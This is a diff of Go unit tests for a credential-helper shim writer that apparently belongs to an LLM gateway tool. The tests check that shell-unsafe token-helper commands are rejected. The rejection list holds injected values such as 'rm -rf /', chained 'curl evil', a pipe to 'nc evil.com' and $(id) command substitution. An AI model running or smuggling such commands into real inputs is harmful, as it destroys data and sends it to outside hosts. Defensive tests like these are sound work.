@@ -52,7 +52,7 @@ func claudeDesktopApplyCfg() llmgateway.ApplyConfig {
 	return llmgateway.ApplyConfig{
 		GatewayURL:         "https://gw.example.com",
 		AnthropicBaseURL:   "https://gw.example.com/anthropic",
-		TokenHelperCommand: `"thv" llm token`,
+		TokenHelperCommand: `thv llm token`,
 	}
 }
 
@@ -85,7 +85,7 @@ func TestConfigureCredentialHelper_WritesConfigMetaAndShim(t *testing.T) {
 	assert.Equal(t, os.FileMode(0o700), info.Mode().Perm())
 	shim, err := os.ReadFile(shimPath) // #nosec G304 -- test-controlled path
 	require.NoError(t, err)
-	assert.Contains(t, string(shim), `"thv" llm token`)
+	assert.Contains(t, string(shim), `thv llm token`)
 	assert.Contains(t, string(shim), "--skip-browser")
 
 	// _meta.json selects our config by the config document's id.
@@ -276,32 +276,33 @@ func TestRevertCredentialHelper_RejectsUnsafeConfigPath(t *testing.T) {
 
 // TestWriteCredentialHelperShim_RejectsUnsafeCommand proves the shim writer
 // fails closed on any tokenHelperCommand it cannot prove is shell-safe, rather
-// than emitting an injectable 0700 /bin/sh script. buildTokenHelperCommand is
-// shell-safe today; this guards against a future caller that isn't.
+// than emitting an injectable 0700 /bin/sh script. The producer is a constant
+// today; this guards against a future caller that isn't.
 func TestWriteCredentialHelperShim_RejectsUnsafeCommand(t *testing.T) {
 	t.Parallel()
 	cm := &ClientManager{homeDir: t.TempDir()}
 
 	unsafe := []string{
-		`"thv" llm token; rm -rf /`,           // trailing command via ;
-		`"thv" llm token #`,                   // trailing comment
-		`"thv" llm token && curl evil`,        // chained command
-		`"thv" llm token|nc evil.com`,         // pipe to external process
-		`"thv" llm token` + "\n" + `rm -rf /`, // embedded newline
-		`unquoted path llm token`,             // missing leading double-quote
-		`"thv" llm tokn`,                      // wrong suffix (not " llm token")
+		`thv llm token; rm -rf /`,           // trailing command via ;
+		`thv llm token #`,                   // trailing comment
+		`thv llm token && curl evil`,        // chained command
+		`thv llm token|nc evil.com`,         // pipe to external process
+		`thv llm token` + "\n" + `rm -rf /`, // embedded newline
+		"thv llm token `id`",                // command substitution
+		`thv llm token $(id)`,               // command substitution
+		`"thv" llm token`,                   // quotes would nest inside the exec line
+		``,                                  // empty
 	}
 	for _, cmd := range unsafe {
 		t.Run(cmd, func(t *testing.T) {
 			t.Parallel()
 			_, err := cm.writeCredentialHelperShim(cmd)
 			require.Error(t, err, "expected rejection of %q", cmd)
-			assert.Contains(t, err.Error(), "shell-safe")
 		})
 	}
 
-	// The shape buildTokenHelperCommand actually produces is accepted.
-	_, err := cm.writeCredentialHelperShim(`"/bin/thv" llm token`)
+	// The bare command the producer actually emits is accepted.
+	_, err := cm.writeCredentialHelperShim(`thv llm token`)
 	require.NoError(t, err)
 }
 
